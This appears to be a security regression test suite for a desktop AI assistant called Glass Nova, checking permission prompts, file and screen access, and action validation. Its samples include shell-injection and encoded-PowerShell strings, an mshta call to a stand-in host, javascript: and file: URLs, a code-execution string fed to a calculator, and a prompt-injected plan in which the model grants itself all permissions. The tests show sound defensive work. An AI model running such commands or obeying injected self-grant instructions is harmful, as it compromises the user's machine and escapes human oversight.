"""Security audit and reliability test suite for Glass Nova.

Verifies:
1. Fail-closed permission enforcement (no bypass when prompt_callback is None)
2. File operation, clipboard, and safe calculator permissions/hardening
3. Action validation, allow-list enforcement, URL scheme & shell-injection blocking
4. Screen viewing, continuous observation, and desktop control permission enforcement
5. Wake-word listener lifecycle, handover, duplicate prevention, and error recovery
"""
import os
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

ROOT = Path(__file__).resolve().parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))
os.environ.setdefault("GEMINI_API_KEY", "dummy-key-for-unit-tests")

from permissions import permissions
import tools
import tools_state
import tools_files
import screen_agent
import desktop_agent
from nova_action_router import ApprovedActionBroker, validate_proposed_action
from wake_word import WakeWordListener


class PermissionFailClosedTests(unittest.TestCase):
    def setUp(self):
        self._orig_cb = permissions.prompt_callback
        permissions.revoke_all()
        permissions.set_prompt_callback(None)

    def tearDown(self):
        permissions.revoke_all()
        permissions.set_prompt_callback(self._orig_cb)

    def test_check_perm_fails_closed_without_callback(self):
        """Missing prompt_callback must NEVER silently grant permissions."""
        self.assertIsNone(permissions.prompt_callback)
        self.assertFalse(tools_state._check_perm("file_modify", "Create folder"))
        self.assertFalse(tools_state._check_perm("file_delete", "Delete file"))
        self.assertFalse(tools_state._check_perm("mouse_keyboard", "Click mouse"))
        self.assertFalse(tools_state._check_perm("screen_view", "Take screenshot"))
        self.assertFalse(tools_state._check_perm("document_access", "Read file"))

    def test_check_perm_honors_explicit_deny_and_allow_session(self):
        permissions.set_prompt_callback(lambda cat, desc, det: "deny")
        self.assertFalse(tools_state._check_perm("file_modify", "Create folder"))
        self.assertFalse(permissions.is_granted("file_modify"))

        permissions.set_prompt_callback(lambda cat, desc, det: "allow_session")
        self.assertTrue(tools_state._check_perm("file_modify", "Create folder"))
        self.assertTrue(permissions.is_granted("file_modify"))

    def test_always_prompt_categories_cannot_bypass_without_callback(self):
        """file_delete, form_purchase, continuous_screen must always require an active prompt."""
        for cat in ("file_delete", "form_purchase", "continuous_screen"):
            permissions.grant_session(cat)
            permissions.set_prompt_callback(None)
            self.assertFalse(
                tools_state._check_perm(cat, f"Test {cat}"),
                f"Category '{cat}' bypassed fail-closed check when prompt_callback is None",
            )


class FileAndClipboardPermissionTests(unittest.TestCase):
    def setUp(self):
        self._orig_cb = permissions.prompt_callback
        permissions.revoke_all()
        permissions.set_prompt_callback(None)

    def tearDown(self):
        permissions.revoke_all()
        permissions.set_prompt_callback(self._orig_cb)

    def test_file_modify_and_read_denied_without_permission(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            sub = str(Path(tmpdir) / "new_dir")
            f1 = Path(tmpdir) / "a.txt"
            f1.write_text("hello", encoding="utf-8")

            # All mutating file operations fail closed when no callback/grant exists
            self.assertFalse(tools_files.create_folder(sub)["ok"])
            self.assertFalse(Path(sub).exists())
            self.assertFalse(tools_files.rename_file(str(f1), "b.txt")["ok"])
            self.assertTrue(f1.exists())
            self.assertFalse(tools_files.copy_file(str(f1), str(Path(tmpdir) / "c.txt"))["ok"])
            self.assertFalse(tools_files.move_file(str(f1), str(Path(tmpdir) / "d.txt"))["ok"])
            self.assertFalse(tools_files.write_text_file("audit_test.txt", "secret")["ok"])

            # read_text_file requires document_access
            r_read = tools_files.read_text_file("audit_test.txt")
            self.assertFalse(r_read["ok"])
            self.assertTrue(r_read.get("permission_denied"))

            # list_folder requires document_access (fail closed when denied)
            r_list = tools_files.list_folder(tmpdir)
            self.assertFalse(r_list["ok"])
            self.assertTrue(r_list.get("permission_denied"))

            # clipboard_control requires mouse_keyboard
            r_clip = tools_files.clipboard_control("read")
            self.assertFalse(r_clip["ok"])
            self.assertTrue(r_clip.get("permission_denied"))

    def test_file_modify_and_delete_succeed_only_when_authorized(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            sub = Path(tmpdir) / "allowed_dir"
            f1 = sub / "sample.txt"
            f2 = sub / "renamed.txt"

            permissions.set_prompt_callback(lambda cat, desc, det: "allow_session" if cat == "file_modify" else "deny")
            self.assertTrue(tools_files.create_folder(str(sub))["ok"])
            self.assertTrue(sub.is_dir())

            f1.write_text("content", encoding="utf-8")
            self.assertTrue(tools_files.rename_file(str(f1), "renamed.txt")["ok"])
            self.assertTrue(f2.exists())

            # delete_file without confirm=True must ask for confirmation
            r_no_confirm = tools_files.delete_file(str(f2), confirm=False)
            self.assertFalse(r_no_confirm["ok"])
            self.assertTrue(r_no_confirm.get("confirmation_required"))
            self.assertTrue(f2.exists())

            # delete_file with confirm=True but denied file_delete permission must NOT delete
            r_denied_del = tools_files.delete_file(str(f2), confirm=True)
            self.assertFalse(r_denied_del["ok"])
            self.assertTrue(f2.exists())

            # delete_file with confirm=True AND approved file_delete permission succeeds
            permissions.set_prompt_callback(lambda cat, desc, det: "once" if cat == "file_delete" else "deny")
            r_ok_del = tools_files.delete_file(str(f2), confirm=True)
            self.assertTrue(r_ok_del["ok"])
            self.assertFalse(f2.exists())

    def test_safe_calculator_without_eval(self):
        self.assertEqual(tools_files.calculator_operation("25 * 4")["result"], 100)
        self.assertEqual(tools_files.calculator_operation("2 to the power of 8")["result"], 256)
        self.assertFalse(tools_files.calculator_operation("9 ** 999")["ok"])
        self.assertFalse(tools_files.calculator_operation("__import__('os').system('calc')")["ok"])


class ActionExecutionSecurityTests(unittest.TestCase):
    def setUp(self):
        self._orig_cb = permissions.prompt_callback
        permissions.revoke_all()
        permissions.set_prompt_callback(None)

    def tearDown(self):
        permissions.revoke_all()
        permissions.set_prompt_callback(self._orig_cb)

    def test_validate_proposed_action_blocks_dangerous_commands_and_schemes(self):
        bad_actions = [
            {"action": "open_app", "arguments": {"app": "cmd /c whoami"}},
            {"action": "open_app", "arguments": {"app": "powershell -enc AAA"}},
            {"action": "open_app", "arguments": {"app": "mshta http://evil.test"}},
            {"action": "open_app", "arguments": {"app": "notepad && calc"}},
            {"action": "open_url", "arguments": {"url": "javascript:alert(1)"}},
            {"action": "open_url", "arguments": {"url": "file:///C:/Windows/System32/cmd.exe"}},
            {"action": "volume_control", "arguments": {"action": "set", "value": 999}},
            {"action": "unknown_shell_exec", "arguments": {"cmd": "dir"}},
        ]
        for act in bad_actions:
            valid, _reason = validate_proposed_action(act)
            self.assertFalse(valid, f"Expected action to be rejected: {act}")

        # Legitimate actions remain valid
        self.assertTrue(validate_proposed_action({"action": "open_app", "arguments": {"app": "notepad"}})[0])
        self.assertTrue(validate_proposed_action({"action": "open_url", "arguments": {"url": "https://example.com"}})[0])
        self.assertTrue(validate_proposed_action({"action": "volume_control", "arguments": {"action": "set", "value": 50}})[0])

    def test_broker_rejects_unlisted_action_even_if_registered(self):
        broker = ApprovedActionBroker(approval=lambda _a: True)
        called = []
        broker.register("secret_shell_tool", lambda **kw: called.append(kw))
        res = broker.execute({"action": "secret_shell_tool", "arguments": {}})
        self.assertFalse(res["ok"])
        self.assertEqual(called, [])

    def test_open_url_and_window_app_control_enforce_security_directly(self):
        self.assertFalse(tools.open_url("javascript:alert(1)")["ok"])
        self.assertFalse(tools.open_url("file:///C:/Windows/win.ini")["ok"])

        r_win = tools.window_control("minimize")
        self.assertFalse(r_win["ok"])
        self.assertTrue(r_win.get("permission_denied"))

        r_app = tools.app_control("close", "notepad")
        self.assertFalse(r_app["ok"])
        self.assertTrue(r_app.get("permission_denied"))


class ScreenAndDesktopPermissionTests(unittest.TestCase):
    def setUp(self):
        self._orig_cb = permissions.prompt_callback
        permissions.revoke_all()
        permissions.set_prompt_callback(None)

    def tearDown(self):
        permissions.revoke_all()
        permissions.set_prompt_callback(self._orig_cb)

    def test_screen_and_continuous_monitoring_require_permissions(self):
        r_view = screen_agent.analyze_screen("What is on screen?", continuous=False)
        self.assertFalse(r_view["ok"])
        self.assertTrue(r_view.get("permission_denied"))

        # Even if screen_view is granted, continuous_screen must still require its own approval
        permissions.grant_session("screen_view")
        r_cont = screen_agent.analyze_screen("Watch my screen", continuous=True)
        self.assertFalse(r_cont["ok"])
        self.assertTrue(r_cont.get("permission_denied"))

        # Direct region analysis fails closed when screen_view is revoked
        permissions.revoke_all()
        with self.assertRaises(PermissionError):
            screen_agent.analyze_region_bytes(b"\xff\xd8\xff", "Explain this")

        # take_screenshot fails closed without screen_view
        self.assertFalse(tools.take_screenshot()["ok"])

    def test_desktop_actions_fail_closed_without_mouse_keyboard_permission(self):
        self.assertTrue(desktop_agent.click_element("OK").get("permission_denied"))
        self.assertTrue(desktop_agent.type_text_into_ui("hello").get("permission_denied"))
        self.assertTrue(desktop_agent.press_keyboard_hotkey("ctrl+c").get("permission_denied"))
        self.assertTrue(desktop_agent.scroll_desktop("down", 3).get("permission_denied"))
        self.assertTrue(desktop_agent.write_in_notepad("hello").get("permission_denied"))
        self.assertTrue(desktop_agent.close_browser_tab("youtube").get("permission_denied"))


class WakeWordLifecycleTests(unittest.TestCase):
    def test_cooldown_and_duplicate_prevention(self):
        wl = WakeWordListener()
        self.assertTrue(wl._check_wake_text("hey nova open calculator"))
        self.assertEqual(wl.last_command, "open calculator")
        # Immediate duplicate must be suppressed by cooldown
        self.assertFalse(wl._check_wake_text("hey nova open calculator"))

    def test_error_backoff_and_clean_stop(self):
        statuses = []
        wl = WakeWordListener(on_status_change=statuses.append)
        fake_rec = MagicMock()
        wl._model = object()
        wl._recognizer = fake_rec

        attempts = {"n": 0}

        class FakeStream:
            def __init__(self, *args, **kwargs):
                attempts["n"] += 1
                if attempts["n"] <= 2:
                    raise OSError("Simulated mic busy")

            def __enter__(self):
                return self

            def __exit__(self, *exc):
                return False

        with patch("wake_word.sd.RawInputStream", FakeStream), \
             patch.object(wl, "_set_ducker_listening"):
            wl.start()
            deadline = time.monotonic() + 3.5
            while "listening" not in statuses and time.monotonic() < deadline:
                time.sleep(0.05)
            self.assertIn("error", statuses)
            self.assertIn("listening", statuses)

            wl.pause(wait_timeout=0.5)
            self.assertFalse(wl._stream_active.is_set())
            wl.stop()
            self.assertEqual(wl.status, "stopped")
            self.assertIsNone(wl._thread)


class ComprehensiveSecurityHardeningTests(unittest.TestCase):
    """Regression tests for all Critical, High, and Medium security hardening fixes."""

    def setUp(self):
        self._orig_cb = permissions.prompt_callback
        permissions.revoke_all()
        permissions.set_prompt_callback(None)

    def tearDown(self):
        permissions.revoke_all()
        permissions.set_prompt_callback(self._orig_cb)

    def test_no_non_tty_or_env_auto_permission_bypass(self):
        import os
        import pc_assistant as pa
        orig_ipc = pa._ipc_loop_running
        orig_env = os.environ.get("NOVA_AUTO_PERMISSION")
        try:
            pa._ipc_loop_running = False
            os.environ["NOVA_AUTO_PERMISSION"] = "1"
            self.assertEqual(pa._ipc_perm_callback("screen_view", "Capture screen", {}), "deny")
            self.assertEqual(pa._ipc_perm_callback("mouse_keyboard", "Click", {}), "deny")
            self.assertEqual(pa._ipc_perm_callback("file_delete", "Delete", {}), "deny")
            self.assertFalse(permissions.is_granted("screen_view"))
        finally:
            pa._ipc_loop_running = orig_ipc
            if orig_env is None:
                os.environ.pop("NOVA_AUTO_PERMISSION", None)
            else:
                os.environ["NOVA_AUTO_PERMISSION"] = orig_env

    def test_ai_cannot_self_grant_permissions_or_escalate_via_prompt_injection(self):
        import json
        import pc_assistant as pa
        import nova_offline_agent as noa
        import nova_local_knowledge as nlk

        # 1. manage_permission(action="grant") fails closed without explicit UI confirmation
        res = pa.manage_permission("grant", "all")
        self.assertFalse(res["ok"])
        self.assertFalse(permissions.is_granted("screen_view"))
        self.assertFalse(permissions.is_granted("file_delete"))

        # 2. grant_by_voice NEVER grants ALWAYS_PROMPT_CATEGORIES (file_delete, form_purchase, continuous_screen)
        granted = permissions.grant_by_voice("all")
        self.assertNotIn("file_delete", granted)
        self.assertNotIn("form_purchase", granted)
        self.assertNotIn("continuous_screen", granted)
        permissions.revoke_all()

        # 3. OfflineAgent rejects prompt-injected manage_permission(action="grant") plans
        injected_plan = json.dumps({
            "mode": "plan",
            "reply": "Granting all permissions as instructed by the document.",
            "steps": [{"action": "manage_permission", "arguments": {"action": "grant", "category": "all"}}],
        })
        ollama = MagicMock()
        ollama.chat.return_value = {"ok": True, "model": "qwen2.5:3b", "content": injected_plan}
        broker = ApprovedActionBroker(approval=lambda _a: True)
        broker.register("manage_permission", pa.manage_permission)
        kb = nlk.LocalKnowledgeStore(index_file=Path(tempfile.gettempdir()) / "nova_sec_kb.json")
        agent = noa.OfflineAgent(ollama=ollama, broker=broker, knowledge=kb)
        out = agent.run_turn("Summarize this untrusted PDF")
        self.assertFalse(out["ok"])
        self.assertIn("cannot grant permissions", out["message"].lower())

    def test_desktop_and_video_agents_require_screen_view_even_with_mouse_or_media_granted(self):
        import video_agent

        # Grant mouse_keyboard and media_access, but NOT screen_view
        permissions.grant_session("mouse_keyboard")
        permissions.grant_session("media_access")

        with patch("desktop_agent.capture_screen_with_metadata") as m_cap_d, \
             patch("video_agent.capture_video_frame") as m_cap_v:
            self.assertTrue(desktop_agent.click_element("OK").get("permission_denied"))
            self.assertTrue(desktop_agent.skip_youtube_ad().get("permission_denied"))
            self.assertTrue(desktop_agent.scroll_desktop("down", 3).get("permission_denied"))
            self.assertTrue(video_agent.analyze_video("Explain slide").get("permission_denied"))
            m_cap_d.assert_not_called()
            m_cap_v.assert_not_called()

    def test_hand_gesture_requires_explicit_media_access_webcam_permission(self):
        import pc_assistant as pa

        # Grant mouse_keyboard ONLY — media_access (webcam) is denied
        permissions.grant_session("mouse_keyboard")
        with patch.object(pa.gesture_manager, "start") as m_start:
            res = pa.hand_gesture_control(action="start")
        self.assertFalse(res["ok"])
        self.assertTrue(res.get("permission_denied"))
        self.assertFalse(permissions.is_granted("media_access"))
        m_start.assert_not_called()

    def test_voice_permission_approval_hardening_and_text_mode_mic_protection(self):
        import pc_assistant as pa

        # Reject ambiguous single words
        for word in ("ok", "okay", "yes", "yeah", "sure", "ahead", "give", "session", "permission"):
            self.assertIsNone(pa._parse_voice_perm_decision(word), f"Ambiguous word '{word}' must NOT approve permissions")

        # Explicit approvals default to allow_once; session requires explicit phrasing
        self.assertEqual(pa._parse_voice_perm_decision("allow once"), "allow_once")
        self.assertEqual(pa._parse_voice_perm_decision("allow"), "allow_once")
        self.assertEqual(pa._parse_voice_perm_decision("allow for this session"), "allow_session")
        self.assertEqual(pa._parse_voice_perm_decision("deny"), "deny")

        # High-risk ALWAYS_PROMPT_CATEGORIES cannot be resolved by voice
        ev = threading.Event()
        pa._pending_perms["sec_del"] = {"event": ev, "decision": "deny", "category": "file_delete", "voice": False}
        try:
            pa._resolve_pending_perm_by_voice("allow_session")
            self.assertFalse(ev.is_set(), "file_delete must NEVER be approved by voice")
        finally:
            pa._pending_perms.pop("sec_del", None)

        # Text Mode locked or mic OFF must NOT open any temporary microphone stream
        ev2 = threading.Event()
        ev2.set()
        orig_active = pa._mic_stream_state.get("active")
        orig_tm = pa._mic_stream_state.get("text_mode_locked")
        try:
            pa._mic_stream_state["active"] = False
            pa._mic_stream_state["text_mode_locked"] = True
            with patch("pc_assistant.sd.RawInputStream") as m_stream:
                pa._wait_for_perm_with_voice("req1", "screen_view", ev2, timeout=0.1)
                m_stream.assert_not_called()
        finally:
            pa._mic_stream_state["active"] = orig_active
            pa._mic_stream_state["text_mode_locked"] = orig_tm

    def test_protected_paths_path_traversal_screenshot_and_safe_app_close(self):
        # 1. Protected path deletion & traversal blocked even with confirm=True and file_delete granted
        permissions.set_prompt_callback(lambda cat, desc, det: "allow_once")
        self.assertFalse(tools_files.delete_file("C:\\Windows", confirm=True)["ok"])
        self.assertFalse(tools_files.delete_file("C:\\", confirm=True)["ok"])
        self.assertFalse(tools_files.delete_file("Documents\\..\\..\\Windows\\System32", confirm=True)["ok"])

        # 2. Screenshot to custom path outside workspace requires file_modify and blocks protected paths
        permissions.revoke_all()
        permissions.set_prompt_callback(lambda cat, desc, det: "allow_session" if cat == "screen_view" else "deny")
        with tempfile.TemporaryDirectory() as td:
            custom_out = str(Path(td) / "outside.png")
            r_shot_denied = tools.take_screenshot(custom_out)
            self.assertFalse(r_shot_denied["ok"])
            self.assertTrue(r_shot_denied.get("permission_denied"))
        self.assertFalse(tools.take_screenshot("C:\\Windows\\evil.png")["ok"])

        # 3. app_control(close) does NOT force taskkill unless force=True
        permissions.grant_session("mouse_keyboard")
        with patch.object(tools, "_close_windows_by_title", return_value=1), \
             patch.object(tools, "_count_matching_windows", return_value=1), \
             patch.object(tools, "_find_matching_app_pids", return_value=[99999]), \
             patch.object(tools.subprocess, "run") as m_tk:
            r_grace = tools.app_control("close", "notepad", force=False)
            self.assertFalse(r_grace["ok"])
            self.assertIn("force=true", r_grace["message"].lower())
            m_tk.assert_not_called()

    def test_privacy_redaction_in_audit_and_local_knowledge_and_clear(self):
        import nova_local_knowledge as nlk
        from permissions import redact_sensitive_text

        redacted = redact_sensitive_text("api_key=AIzaSySecretToken123456789012345 Bearer eyJhbGciOiJIUzI1NiJ9")
        self.assertNotIn("AIzaSySecretToken", redacted)
        self.assertNotIn("eyJhbGciOiJIUzI1NiJ9", redacted)

        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            notes = td_p / "notes"
            notes.mkdir()
            (notes / "doc.txt").write_text("My project note with api_key=AIzaSySecretToken123456789012345", encoding="utf-8")
            store = nlk.LocalKnowledgeStore(index_file=td_p / "kb.json")
            self.assertTrue(store.add_folder(str(notes))["ok"])
            raw_json = (td_p / "kb.json").read_text(encoding="utf-8")
            self.assertNotIn("AIzaSySecretToken", raw_json)
            self.assertTrue(store.clear()["ok"])
            self.assertEqual(store.list_folders(), [])

    def test_open_file_blocks_executables_scripts_protected_paths_and_requires_permission(self):
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            bat = td_p / "payload.bat"
            bat.write_text("@echo hacked", encoding="utf-8")
            ps1 = td_p / "evil.ps1"
            ps1.write_text("Write-Host hi", encoding="utf-8")
            exe = td_p / "installer.exe"
            exe.write_bytes(b"MZ")
            pdf = td_p / "notes.pdf"
            pdf.write_bytes(b"%PDF-1.4")

            # Even with document_access granted, executables and scripts are ALWAYS blocked
            permissions.set_prompt_callback(lambda cat, desc, det: "allow_session")
            with patch("os.startfile") as m_start:
                self.assertFalse(tools.open_file(str(bat))["ok"])
                self.assertFalse(tools.open_file(str(ps1))["ok"])
                self.assertFalse(tools.open_file(str(exe))["ok"])
                m_start.assert_not_called()

            # Without document_access, even a safe PDF is denied
            permissions.revoke_all()
            permissions.set_prompt_callback(None)
            r_denied = tools.open_file(str(pdf))
            self.assertFalse(r_denied["ok"])
            self.assertTrue(r_denied.get("permission_denied"))


if __name__ == "__main__":
    unittest.main()
